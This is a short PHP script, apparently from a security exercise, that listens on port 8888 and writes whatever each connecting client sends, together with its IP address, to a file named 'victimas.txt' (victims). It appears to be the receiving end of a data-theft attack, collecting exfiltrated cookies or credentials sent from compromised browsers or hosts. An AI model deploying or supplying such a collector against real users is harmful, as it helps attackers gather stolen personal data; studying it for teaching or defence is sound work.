<?php
$sock = socket_create_listen(8888);
socket_getsockname($sock, $addr, $port);
$ficheroSalida = fopen('/home/inigo/Escritorio/Seguridad/victimas.txt', 'w');
while($c = socket_accept($sock)) {
   socket_getpeername($c, $raddr, $rport);
   $read = socket_read($c, 1024);
   fwrite($ficheroSalida, $read.'  '.$raddr."\n");
}
socket_close($sock); 
?>
